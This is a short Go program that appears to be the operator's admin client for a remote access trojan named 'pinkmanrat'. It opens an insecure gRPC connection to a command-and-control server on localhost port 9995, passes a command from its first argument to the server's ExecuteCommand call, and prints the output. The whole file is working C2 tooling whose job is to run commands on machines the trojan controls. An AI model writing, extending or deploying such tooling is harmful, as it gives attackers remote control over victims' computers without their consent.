package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"pinkmanrat/c2grpcapi"

	"google.golang.org/grpc"
)

func main() {
	var (
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client c2grpcapi.AdminClient
	)

	opts = append(opts, grpc.WithInsecure())

	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 9995), opts...); err != nil {
		log.Fatal((err))
	}

	defer conn.Close()

	client = c2grpcapi.NewAdminClient(conn)

	var cmd = new(c2grpcapi.Command)

	cmd.Input = os.Args[1]
	ctx := context.Background()

	cmd, err = client.ExecuteCommand(ctx, cmd)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(cmd.Output)
}
